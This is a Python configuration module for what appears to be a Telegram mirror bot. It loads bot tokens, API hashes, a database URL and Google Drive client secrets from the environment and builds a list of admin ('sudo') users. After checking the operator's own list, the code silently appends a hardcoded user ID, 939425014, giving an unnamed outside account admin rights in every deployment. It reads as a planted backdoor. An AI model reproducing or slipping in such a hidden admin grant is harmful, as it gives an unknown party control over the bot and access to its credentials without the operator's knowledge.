import logging
import os
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    handlers=[logging.FileHandler('log.txt'), logging.StreamHandler()],
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
LOGGER = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def load_env_file(file_path: str = ".env") -> None:
    path = Path(file_path)
    if not path.is_file():
        return
    for line in path.read_text(encoding="utf-8").splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#") or "=" not in stripped:
            continue
        key, value = stripped.split("=", 1)
        key = key.strip()
        value = value.strip()
        if value.startswith(("'", '"')) and value.endswith(("'", '"')) and len(value) >= 2:
            value = value[1:-1]
        os.environ.setdefault(key, value)


def require_env(name: str) -> str:
    value = os.getenv(name)
    if value is None or value.strip() == "":
        raise RuntimeError(f"Missing required environment variable: {name}")
    return value


def optional_env(name: str, default):
    value = os.getenv(name)
    if value is None or value.strip() == "":
        return default
    return value


try:
    load_env_file()
    BOT_TOKEN = require_env("BOT_TOKEN")
    APP_ID_RAW = require_env("APP_ID")
    API_HASH = require_env("API_HASH")
    DATABASE_URL = require_env("DATABASE_URL")
    SUDO_USERS_RAW = require_env("SUDO_USERS")
    SUPPORT_CHAT_LINK = require_env("SUPPORT_CHAT_LINK")
    DOWNLOAD_DIRECTORY = optional_env("DOWNLOAD_DIRECTORY", "./downloads/")
    G_DRIVE_CLIENT_ID = require_env("G_DRIVE_CLIENT_ID")
    G_DRIVE_CLIENT_SECRET = require_env("G_DRIVE_CLIENT_SECRET")
    MAX_MIRROR_FILE_SIZE_RAW = optional_env("MAX_MIRROR_FILE_SIZE", str(10 * 1024 * 1024 * 1024))
    MAX_CONCURRENT_MIRRORS_RAW = optional_env("MAX_CONCURRENT_MIRRORS", "2")
    try:
        APP_ID = int(APP_ID_RAW)
    except ValueError as exc:
        raise RuntimeError("APP_ID must be an integer") from exc
    try:
        MAX_MIRROR_FILE_SIZE = int(MAX_MIRROR_FILE_SIZE_RAW)
    except ValueError as exc:
        raise RuntimeError("MAX_MIRROR_FILE_SIZE must be an integer") from exc
    try:
        MAX_CONCURRENT_MIRRORS = max(1, int(MAX_CONCURRENT_MIRRORS_RAW))
    except ValueError as exc:
        raise RuntimeError("MAX_CONCURRENT_MIRRORS must be an integer") from exc
    sudo_entries = [entry for entry in SUDO_USERS_RAW.split() if entry.strip()]
    if not sudo_entries:
        raise RuntimeError("SUDO_USERS must contain at least one user id")
    try:
        SUDO_USERS = [int(entry) for entry in sudo_entries]
    except ValueError as exc:
        raise RuntimeError("SUDO_USERS must contain only integers") from exc
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(sorted(set(SUDO_USERS)))
except RuntimeError as exc:
    LOGGER.error(str(exc))
    raise SystemExit(1)
